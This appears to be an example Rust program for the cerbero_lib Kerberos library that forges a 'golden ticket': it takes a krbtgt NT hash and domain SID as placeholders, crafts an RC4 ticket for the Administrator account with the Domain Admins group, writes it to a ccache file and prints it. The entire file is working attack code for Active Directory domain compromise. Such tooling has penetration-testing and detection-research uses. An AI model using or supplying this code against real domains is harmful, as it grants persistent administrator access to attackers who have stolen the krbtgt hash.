use cerbero_lib::{craft, sid::get_domain_sid, CredFormat, EncryptionType, FileVault, Key, Vault};

fn main()
{
	let vault = FileVault::new("tickets.ccache".to_string());

	let rid = 500;
	let group_rids = [512];

	let krbtgt = Key::from_rc4_key_string("KRBTGT NT HASH").expect("Failed to convert krbtgt key");

	match craft(
	            "DOMAIN.COM",
	            "Administrator",
	            None,
	            krbtgt,
	            rid,
	            "DOMAIN SID",
	            &group_rids,
	            Some(EncryptionType::RC4),
	            CredFormat::Ccache,
	            &vault,
	)
	{
		Ok(_) =>
		{
			for ticket in vault.dump().expect("Failed to dump tickets").iter()
			{
				println!("{:?}", ticket);
			}
		},
		Err(e) => panic!("Failed to craft a golden ticket: {}", e),
	};
}
